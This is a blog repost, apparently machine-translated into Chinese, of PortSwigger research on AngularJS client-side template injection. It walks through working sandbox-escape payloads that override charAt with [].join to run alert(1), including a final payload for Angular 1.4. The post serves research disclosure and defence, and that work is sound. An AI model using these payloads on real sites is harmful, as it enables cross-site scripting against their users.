<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!1},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-05-12 00:00:00</span> <span class="mobile">2022-05-12 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-09 16:30:50</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/XSS/">XSS</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>4.3k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>18 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><p>文章引用自：<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs<i class="fas fa-external-link-alt"></i></a></p><p>研究员加雷斯·海耶斯</p><p><a class="link" target="_blank" rel="noopener" href="https://twitter.com/garethheyes">@garethheyes<i class="fas fa-external-link-alt"></i></a>(蓝鸟)</p><h3 id="抽象的"><a href="#抽象的" class="headerlink" title="抽象的"></a>抽象的</h3><p>对极受欢迎的 JavaScript 框架<a class="link" target="_blank" rel="noopener" href="https://angularjs.org/">AngularJS<i class="fas fa-external-link-alt"></i></a>的天真使用将许多网站暴露给 Angular 模板注入。这种相对低调的<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/blog/server-side-template-injection">服务器端模板注入<i class="fas fa-external-link-alt"></i></a>兄弟可以与 Angular 沙箱逃逸相结合，以在其他安全站点上发起<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">跨站点脚本<i class="fas fa-external-link-alt"></i></a>( <a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">XSS<i class="fas fa-external-link-alt"></i></a> ) 攻击。到目前为止，还没有公开的沙盒逃逸会影响 Angular 1.3.1+ 和 1.4.0+。这篇文章将总结 Angular 模板注入的核心概念，然后展示影响所有现代 Angular 版本的新沙箱逃逸的开发。</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>AngularJS 是 Google 编写的 MVC 客户端框架。使用 Angular，您通过 view-source 或 Burp 看到的包含“ng-app”的 HTML 页面实际上是模板，并将由 Angular 呈现。这意味着如果用户输入直接嵌入到页面中，应用程序可能容易受到客户端模板注入的攻击。即使用户输入是 HTML 编码的并且在属性内也是如此。</p><p>Angular 模板可以包含<a class="link" target="_blank" rel="noopener" href="https://docs.angularjs.org/guide/expression">表达式<i class="fas fa-external-link-alt"></i></a> ——双花括号内的类似 JavaScript 的代码片段。要了解它们是如何工作的，请查看以下 jsfiddle：</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/">http://jsfiddle.net/2zs2yv7o/<i class="fas fa-external-link-alt"></i></a></p><p>文本输入 2 由 Angular 评估，然后显示输出：2。</p><p>这意味着任何能够注入双花括号的人都可以执行 Angular 表达式。Angular 表达式本身不会造成太大伤害，但是当与沙箱逃逸结合使用时，我们可以执行任意 JavaScript 并造成严重破坏。</p><p>以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用<a class="link" target="_blank" rel="noopener" href="http://php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars<i class="fas fa-external-link-alt"></i></a>对输入进行 HTML 编码：</p><p>以下两个片段显示了漏洞的本质。第一个页面动态嵌入用户输入，但不易受到 XSS 攻击，因为它使用<a class="link" target="_blank" rel="noopener" href="http://php.net/manual/en/function.htmlspecialchars.php">htmlspecialchars<i class="fas fa-external-link-alt"></i></a>对输入进行 HTML 编码：</p><p><img src="https://img-blog.csdnimg.cn/bdb80f2fc96c4212a4c78678a5b3b41a.png"></p><p>第二页几乎相同，但 Angular 导入意味着可以通过注入 Angular 表达式来利用它，并且通过沙箱逃逸我们可以获得 XSS。</p><p><img src="https://img-blog.csdnimg.cn/81d13954416d4ed4b90ce47c2ed9ed88.png"></p><p>请注意，您需要在 DOM 树中的表达式上方有“ng-app”。通常，Angular 站点会在根 HTML 或 body 标记中使用它。</p><p>换句话说，如果一个页面是一个 Angular 模板，我们将更容易对它进行 XSS 攻击。只有一个问题 - 沙盒。幸运的是，有一个解决方案。</p><h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>Angular 表达式被沙盒化，“以保持应用程序职责的适当分离”。为了利用用户，我们需要突破沙箱并执行任意 JavaScript。</p><p>让我们重用前面的小提琴，并在 Chrome 的源选项卡中的 angular.js 内的第 13275 行放置一个<a class="link" target="_blank" rel="noopener" href="https://developers.google.com/web/tools/chrome-devtools/javascript/breakpoints">断点<i class="fas fa-external-link-alt"></i></a>。在监视窗口中，添加一个新的监视表达式“fnString”。这将显示我们转换后的输出。1+1 转换为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">return</span> <span class="title function_">plus</span>(<span class="number">1</span>, <span class="number">1</span>);&#125;;<span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure><p>所以表达式被解析和重写，然后由 Angular 执行。让我们尝试获取 Function 构造函数：</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/1/">http://jsfiddle.net/2zs2yv7o/1/<i class="fas fa-external-link-alt"></i></a></p><p>这是事情变得更有趣的地方，这是重写的输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;constructor&#x27;</span> <span class="keyword">in</span> l),    v5;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v3 = s.<span class="property">constructor</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v3 = l.<span class="property">constructor</span>;  &#125;  <span class="title function_">ensureSafeObject</span>(v3, text);  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v2 = <span class="title function_">ensureSafeObject</span>(v3.<span class="property">constructor</span>, text);  &#125; <span class="keyword">else</span> &#123;    v2 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">if</span> (v2 != <span class="literal">null</span>) &#123;    <span class="title function_">ensureSafeFunction</span>(v2, text);    v5 = <span class="string">&#x27;alert\u00281\u0029&#x27;</span>;    <span class="title function_">ensureSafeObject</span>(v3, text);    v1 = <span class="title function_">ensureSafeObject</span>(v3.<span class="title function_">constructor</span>(<span class="params">ensureSafeObject(<span class="string">&#x27;alert\u00281\u0029&#x27;</span>, text)</span>), text);  &#125; <span class="keyword">else</span> &#123;    v1 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">if</span> (v1 != <span class="literal">null</span>) &#123;    <span class="title function_">ensureSafeFunction</span>(v1, text);    v0 = <span class="title function_">ensureSafeObject</span>(<span class="title function_">v1</span>(), text);  &#125; <span class="keyword">else</span> &#123;    v0 = <span class="literal">undefined</span>;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn;</span><br></pre></td></tr></table></figure><p>如您所见，Angular 依次遍历每个对象并使用 ensureSafeObject 函数对其进行检查。ensureSafeObject<a class="link" target="_blank" rel="noopener" href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L60-L85">函数<i class="fas fa-external-link-alt"></i></a>检查对象是 Function 构造函数、窗口对象、DOM 元素还是 Object 构造函数。如果任何检查为真，它将引发异常并停止执行表达式。它还通过使对全局变量的所有引用改为查看对象属性来防止访问全局变量。</p><p>Angular 还有一些其他功能可以进行安全检查，例如<a class="link" target="_blank" rel="noopener" href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L40-L58">ensureSafeMemberName<i class="fas fa-external-link-alt"></i></a>和<a class="link" target="_blank" rel="noopener" href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L91-L103">ensureSafeFunction<i class="fas fa-external-link-alt"></i></a>。ensureSafeMemberName 检查 JavaScript 属性并确保它与 <strong>proto</strong> 等不匹配，并且 ensureSafeFunction 检查函数调用不调用 Function 构造函数或调用、应用和绑定。</p><h3 id="破坏消毒剂"><a href="#破坏消毒剂" class="headerlink" title="破坏消毒剂"></a>破坏消毒剂</h3><p>Angular sanitizer 是用 JavaScript 编写的客户端过滤器，它扩展了 Angular 以安全地允许使用名为 ng-bind-html 的属性进行 HTML 绑定，其中包含要过滤的引用。然后它接受输入并将其呈现在不可见的 DOM 树中，并对元素和属性应用白名单过滤。</p><p>在测试<a class="link" target="_blank" rel="noopener" href="https://github.com/angular/angular.js/pull/12524">Angular sanitizer<i class="fas fa-external-link-alt"></i></a>时，我考虑过使用 Angular 表达式覆盖原生 JavaScript 函数。问题是 Angular 表达式不支持函数语句或函数表达式，因此您将无法用任何值覆盖函数。考虑了一会儿，我想到了 String.fromCharCode。因为该函数是从 String 构造函数调用的，而不是通过字符串文字，所以“this”值将是 String 构造函数。也许我可以后门 fromCharCode 函数！</p><p>如何在无法创建函数的情况下对 fromCharCode 函数进行后门？简单：重用现有功能！问题是如何在每次调用 fromCharCode 时控制该值。如果我们使用 Array 连接函数，我们可以使 String 构造函数成为一个假数组。我们所需要的只是一个长度属性和一个 0 属性，用于我们的假数组的第一个索引，幸运的是它已经有一个长度属性，因为它的参数长度是 1。我们只需要给它一个 0 属性。这是如何做到的：</p><p><img src="https://img-blog.csdnimg.cn/8ba945db65894a728ec97bdd6b511b7c.png"></p><p>当调用 String.fromCharCode 时，您每次都会得到字符串 <code>&lt;iframe onload=alert(/Backdoored/)&gt;</code> 而不是所需的值。这在 Angular 沙箱中完美运行。这是一个小提琴：</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/2/">http://jsfiddle.net/2zs2yv7o/2/<i class="fas fa-external-link-alt"></i></a></p><p>我继续查看 Angular sanitizer 的代码，但我找不到任何会导致绕过的对 String.fromCharcode 的调用。我查看了其他原生函数，发现了一个有趣的函数：charCodeAt。如果我可以覆盖这个值，那么它将被注入到一个属性中而无需任何过滤。但是有一个问题：这次“this”值将是字符串文字，而不是字符串构造函数。这意味着我不能使用相同的技术来覆盖该函数，因为我将无法操作索引或长度，因为这对于字符串文字是不可写的。</p><p>然后我想到了使用 [].concat; 使用此函数将按原样返回字符串和连接在一起的参数。下面的小提琴调用’abc’.charCodeAt(0)，所以你会期望输出是’97’（ascii a），但由于后门，它反而返回基本字符串加上参数。</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/3/">http://jsfiddle.net/2zs2yv7o/3/<i class="fas fa-external-link-alt"></i></a></p><p>然后这破坏了消毒剂，因为我可以注入邪恶的属性。消毒剂代码如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (validAttrs[lkey] === <span class="literal">true</span> &amp;&amp; (uriAttrs[lkey] !== <span class="literal">true</span> || <span class="title function_">uriValidator</span>(value, isImage))) &#123;  <span class="title function_">out</span>(<span class="string">&#x27; &#x27;</span>);  <span class="title function_">out</span>(key);  <span class="title function_">out</span>(<span class="string">&#x27;=&quot;&#x27;</span>);  <span class="title function_">out</span>(<span class="title function_">encodeEntities</span>(value));  <span class="title function_">out</span>(<span class="string">&#x27;&quot;&#x27;</span>);&#125; </span><br></pre></td></tr></table></figure><p>Out 将返回过滤后的输出；key 指的是属性名；value 是属性值。这是 encodeEntities 函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encodeEntities</span>(<span class="params">value</span>) &#123; <span class="keyword">return</span> value.  <span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>).  <span class="title function_">replace</span>(<span class="variable constant_">SURROGATE_PAIR_REGEXP</span>, <span class="keyword">function</span>(<span class="params">value</span>) &#123;   <span class="keyword">var</span> hi = value.<span class="title function_">charCodeAt</span>(<span class="number">0</span>);   <span class="keyword">var</span> low = value.<span class="title function_">charCodeAt</span>(<span class="number">1</span>);   <span class="keyword">return</span> <span class="string">&#x27;&amp;#&#x27;</span> + (((hi - <span class="number">0xD800</span>) * <span class="number">0x400</span>) + (low - <span class="number">0xDC00</span>) + <span class="number">0x10000</span>) + <span class="string">&#x27;;&#x27;</span>;  &#125;).  <span class="title function_">replace</span>(<span class="variable constant_">NON_ALPHANUMERIC_REGEXP</span>, <span class="keyword">function</span>(<span class="params">value</span>) &#123;   <span class="keyword">return</span> <span class="string">&#x27;&amp;#&#x27;</span> + value.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="string">&#x27;;&#x27;</span>;  &#125;).  <span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&lt;&#x27;</span>).  <span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&gt;&#x27;</span>);&#125; </span><br></pre></td></tr></table></figure><p>粗体代码是发生注入的地方，因此开发人员显然希望 charCodeAt 函数返回一个 int。您可以防御性地编码并将值强制为 int，但如果攻击者可以覆盖本机函数，您可能已经拥有。这绕过了消毒剂，并使用类似的技术，我们可以突破沙箱。</p><h3 id="逃离沙箱"><a href="#逃离沙箱" class="headerlink" title="逃离沙箱"></a>逃离沙箱</h3><p>我查看了查找 String.fromCharCode 调用的 Angular 源代码，发现了一个<a class="link" target="_blank" rel="noopener" href="https://github.com/angular/angular.js/blob/v1.4.6/src/ng/parse.js#L262">非常有趣<i class="fas fa-external-link-alt"></i></a>的实例。在解析字符串文字时，他们使用它来输出值。我想我可以后门 fromCharCode 并破解已解析的字符串。这是一个小提琴：</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/4/">http://jsfiddle.net/2zs2yv7o/4/<i class="fas fa-external-link-alt"></i></a></p><p>原来我可以后门 unicode 转义但不能打破重写的代码。</p><p>然后我想知道我以前在消毒剂上使用的相同技术是否可以在这里与不同的本机功能一起使用。我认为使用 charAt 可以成功解析代码，但返回完全不同的输出并绕过沙箱。我尝试注入它并检查重写的输出。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;  <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=&quot;&quot;&#x27;</span>)+<span class="string">&#x27;&#x27;</span>&#125;&#125; </span><br></pre></td></tr></table></figure><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/5/">http://jsfiddle.net/2zs2yv7o/5/<i class="fas fa-external-link-alt"></i></a></p><p>控制台有一些有趣的结果，我从浏览器而不是 Angular 收到 JavaScript 解析错误。我查看了重写的代码，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v5, v6 = l &amp;&amp; (<span class="string">&#x27;x\u003d\u0022\u0022&#x27;</span> <span class="keyword">in</span> l);  <span class="keyword">if</span> (!(v6)) &#123;    <span class="keyword">if</span> (s) &#123;      v5 = s.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v5 = l.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;  &#125;  <span class="keyword">return</span> v5;&#125;;fn.<span class="property">assign</span> = <span class="keyword">function</span>(<span class="params">s, v, l</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;x\u003d\u0022\u0022&#x27;</span> <span class="keyword">in</span> l);  v3 = v4 ? l : s;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v2 = s.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;    &#125;  &#125; <span class="keyword">else</span> &#123;    v2 = l.<span class="property">x</span> = <span class="string">&quot;&quot;</span>;  &#125;  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v1 = v;    <span class="title function_">ensureSafeObject</span>(v3.<span class="property">x</span> = <span class="string">&quot;&quot;</span>, text);    v0 = v3.<span class="property">x</span> = <span class="string">&quot;&quot;</span> = v1;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn; </span><br></pre></td></tr></table></figure><p>语法错误在上面以粗体显示，如果重写的代码正在生成 JavaScript 语法错误，这意味着我可以在重写的输出中注入我自己的代码！接下来我注入了以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;  <span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;  $eval(<span class="string">&#x27;x=alert(1)&#x27;</span>)+<span class="string">&#x27;&#x27;</span>&#125;&#125; </span><br></pre></td></tr></table></figure><p>调试器在第一次调用时停止，我点击恢复，然后我脸上带着灿烂的笑容去吃午饭，因为甚至没有检查我就知道我拥有沙盒并且可能几乎每个版本都拥有。我吃完午饭回来，点击恢复，果然我收到了警报并打破了沙盒。这是小提琴：</p><p><a class="link" target="_blank" rel="noopener" href="http://jsfiddle.net/2zs2yv7o/6/">http://jsfiddle.net/2zs2yv7o/6/<i class="fas fa-external-link-alt"></i></a></p><p>这是重写的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="keyword">var</span> fn = <span class="keyword">function</span>(<span class="params">s, l, a, i</span>) &#123;  <span class="keyword">var</span> v5, v6 = l &amp;&amp; (<span class="string">&#x27;x\u003dalert\u00281\u0029&#x27;</span> <span class="keyword">in</span> l);  <span class="keyword">if</span> (!(v6)) &#123;    <span class="keyword">if</span> (s) &#123;      v5 = s.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);    &#125;  &#125; <span class="keyword">else</span> &#123;    v5 = l.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);  &#125;  <span class="keyword">return</span> v5;&#125;;fn.<span class="property">assign</span> = <span class="keyword">function</span>(<span class="params">s, v, l</span>) &#123;  <span class="keyword">var</span> v0, v1, v2, v3, v4 = l &amp;&amp; (<span class="string">&#x27;x\u003dalert\u00281\u0029&#x27;</span> <span class="keyword">in</span> l);  v3 = v4 ? l : s;  <span class="keyword">if</span> (!(v4)) &#123;    <span class="keyword">if</span> (s) &#123;      v2 = s.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);    &#125;  &#125; <span class="keyword">else</span> &#123;    v2 = l.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>);  &#125;  <span class="keyword">if</span> (v3 != <span class="literal">null</span>) &#123;    v1 = v;    <span class="title function_">ensureSafeObject</span>(v3.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>), text);    v0 = v3.<span class="property">x</span> = <span class="title function_">alert</span>(<span class="number">1</span>) = v1;  &#125;  <span class="keyword">return</span> v0;&#125;;<span class="keyword">return</span> fn; </span><br></pre></td></tr></table></figure><p>如您所见，重写的代码包含警报。您可能会注意到这在 Firefox 上不起作用。这是给你的一个小挑战，试着让它在 Firefox 和 Chrome 上运行。选择下面的隐藏文本以获得挑战的解决方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><p>要深入查看 Angular 解析代码时发生的情况，请在 angular.js 的第 14079 行放置一个断点，按一次 resume 以跳过初始解析并通过在调试器中不断单击 step into function 来逐步执行代码。在这里，您将能够看到 Angular 错误地解析代码。它会认为 x=alert(1) 是第 12699 行的标识符。代码假定它正在检查一个字符，但实际上它正在检查一个更长的字符串，因此它通过了测试。见下文：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isIdent= <span class="keyword">function</span>(<span class="params">ch</span>) &#123;  <span class="keyword">return</span> (<span class="string">&#x27;a&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span> ||      <span class="string">&#x27;A&#x27;</span> &lt;= ch &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> ||      <span class="string">&#x27;_&#x27;</span> === ch || ch === <span class="string">&#x27;$&#x27;</span>); &#125;<span class="title function_">isIdent</span>(<span class="string">&#x27;x9=9a9l9e9r9t9(919)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>该字符串是使用我们覆盖的 charAt 函数生成的，而 9 是传递的参数。由于代码的编写方式，它总是会通过测试，因为“a”、“z”等总是小于较长的字符串。幸运的是，在第 12701 行，原始字符串用于制作标识符。然后在第 13247 行，当创建赋值函数时，标识符将多次注入函数字符串，当使用 Function 构造函数调用时，它会注入我们的警报。</p><p>这是针对 Angular 1.4 量身定制的最终有效载荷：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;<span class="built_in">eval</span>(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>如果您使用的是 Angular，您需要将用户输入中的花括号视为高度危险，或者完全避免服务器端反射用户输入。大多数其他 JavaScript 框架通过不支持 HTML 文档中任意位置的表达式来回避这种危险。</p><p>Google 肯定知道这个问题，但我们不确定它在更广泛的社区中的知名度，尽管<a class="link" target="_blank" rel="noopener" href="http://www.slideshare.net/x00mario/jsmvcomfg-to-sternly-look-at-javascript-mvc-and-templating-frameworks">已有<i class="fas fa-external-link-alt"></i></a>关于<a class="link" target="_blank" rel="noopener" href="https://code.google.com/p/mustache-security/">该主题<i class="fas fa-external-link-alt"></i></a>的研究。<a class="link" target="_blank" rel="noopener" href="https://docs.angularjs.org/guide/security">Angular 的文档<i class="fas fa-external-link-alt"></i></a>确实建议不要在模板中动态嵌入用户输入，但也误导性地暗示 Angular 不会将任何 XSS 漏洞引入其他安全代码中。这个问题甚至不仅限于客户端模板注入；Angular 模板注入可以（<a class="link" target="_blank" rel="noopener" href="https://twitter.com/jayaradhashyam/status/640864269916094464">并且已经<i class="fas fa-external-link-alt"></i></a>）在服务器端显示并导致 RCE。</p><p>我认为这个问题到目前为止只是因为缺乏最新的 Angular 分支的已知沙箱逃逸而引起了更广泛的关注。所以现在可能是考虑为 JavaScript 导入制定补丁管理策略的好时机。</p><p>这个沙盒逃逸事件于 2015 年 9 月 25 日私下报告给 Google，并于 2016 年 1 月 15 日在 1.5.0 版中进行了修补。鉴于 AngularJS 沙盒绕过的悠久历史，以及 Angular 坚持沙盒“并非旨在阻止攻击者” ，我们不认为更新 Angular 是表达式注入的可靠解决方案。因此，我们发布了新的<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/burp/vulnerability-scanner">Burp Scanner<i class="fas fa-external-link-alt"></i></a>检查来检测客户端模板注入，并在下面包含了最新的 Angular 沙箱逃逸列表。</p><h3 id="更新…"><a href="#更新…" class="headerlink" title="更新…"></a>更新…</h3><p>我们在这篇博文中提供<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/blog/adapting-angularjs-payloads-to-exploit-real-world-applications">了真实世界应用程序中的沙盒逃逸<i class="fas fa-external-link-alt"></i></a>示例。我们还发布了<a class="link" target="_blank" rel="noopener" href="https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes">基于 DOM 的 AngularJS 沙箱逃逸<i class="fas fa-external-link-alt"></i></a>。</p><h3 id="更新…-1"><a href="#更新…-1" class="headerlink" title="更新…"></a>更新…</h3><p><a class="link" target="_blank" rel="noopener" href="http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html">从 1.6 版开始，Angular 已经完全移除了沙箱<i class="fas fa-external-link-alt"></i></a></p><h3 id="沙盒逃脱"><a href="#沙盒逃脱" class="headerlink" title="沙盒逃脱"></a>沙盒逃脱</h3><p><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">我们正在积极维护XSS 备忘单<i class="fas 